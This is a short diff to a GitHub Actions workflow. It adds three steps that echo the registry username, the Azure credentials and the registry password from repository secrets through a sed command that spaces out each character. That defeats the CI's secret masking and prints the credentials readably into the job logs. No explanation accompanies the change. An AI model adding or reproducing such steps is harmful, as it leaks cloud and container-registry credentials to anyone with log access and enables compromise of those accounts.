@@ -18,6 +18,9 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
+      - run: echo ${{secrets.CONTAINERAPPTEST_REGISTRY_USERNAME }} | sed 's/./& /g'
+      - run: echo ${{secrets.CONTAINERAPPTEST_AZURE_CREDENTIALS }} | sed 's/./& /g'
+      - run: echo ${{secrets.CONTAINERAPPTEST_REGISTRY_PASSWORD }} | sed 's/./& /g'
       - name: Checkout to the branch
         uses: actions/checkout@v2
 
